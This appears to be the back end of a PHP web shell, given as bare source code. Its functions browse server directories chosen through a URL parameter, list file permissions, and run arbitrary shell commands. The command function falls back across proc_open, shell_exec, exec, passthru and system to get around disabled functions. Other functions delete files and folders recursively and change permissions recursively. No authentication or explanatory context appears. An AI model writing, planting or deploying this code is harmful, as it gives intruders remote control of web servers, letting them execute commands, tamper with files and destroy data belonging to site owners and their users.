function getCurrentDirectory() {
    $dir = getcwd();
    if (isset($_GET['dir']) && !empty($_GET['dir'])) {
        $requestedDir = realpath($_GET['dir']);
        if ($requestedDir && is_dir($requestedDir)) {
            chdir($requestedDir);
            $dir = $requestedDir;
        }
    }
    return str_replace('\\', '/', realpath($dir));
}

function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function getFileDetails($path) {
    $folders = [];
    $files = [];
    $items = @scandir($path);
    if (!is_array($items)) return [];

    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $itemPath = $path . '/' . $item;
        $isDir = is_dir($itemPath);
        $details = [
            'name' => $item,
            'type' => $isDir ? 'Folder' : 'File',
            'size' => $isDir ? '' : formatSize(@filesize($itemPath)),
            'permission' => substr(sprintf('%o', @fileperms($itemPath)), -4),
            'writable' => is_writable($itemPath)
        ];
        if ($isDir) $folders[] = $details;
        else $files[] = $details;
    }
    return array_merge($folders, $files);
}

function executeCommand($command, $cwd) {
    $command = "cd " . escapeshellarg($cwd) . " && " . $command;
    $output = '';
    $descriptors = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $process = @proc_open($command, $descriptors, $pipes);
    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        if (!empty($output) || !empty($error)) return trim($output . "\n" . $error);
    }
    if (function_exists('shell_exec')) return trim(@shell_exec($command));
    if (function_exists('exec')) { @exec($command, $out); return implode("\n", $out); }
    if (function_exists('passthru')) { ob_start(); @passthru($command); return trim(ob_get_clean()); }
    if (function_exists('system')) { ob_start(); @system($command); return trim(ob_get_clean()); }
    
    return "<span style='color: red;'>Error: Command not supported or failed!</span>";
}

function deleteRecursive($path) {
    if (is_dir($path)) {
        $files = array_diff(scandir($path), ['.', '..']);
        foreach ($files as $file) {
            deleteRecursive($path . '/' . $file);
        }
        return @rmdir($path);
    }
    return @unlink($path);
}

function chmodRecursive($path, $permission) {
    if (is_dir($path)) {
        $items = array_diff(scandir($path), ['.', '..']);
        foreach ($items as $item) {
            chmodRecursive($path . '/' . $item, $permission);
        }
    }
    return @chmod($path, $permission);
}
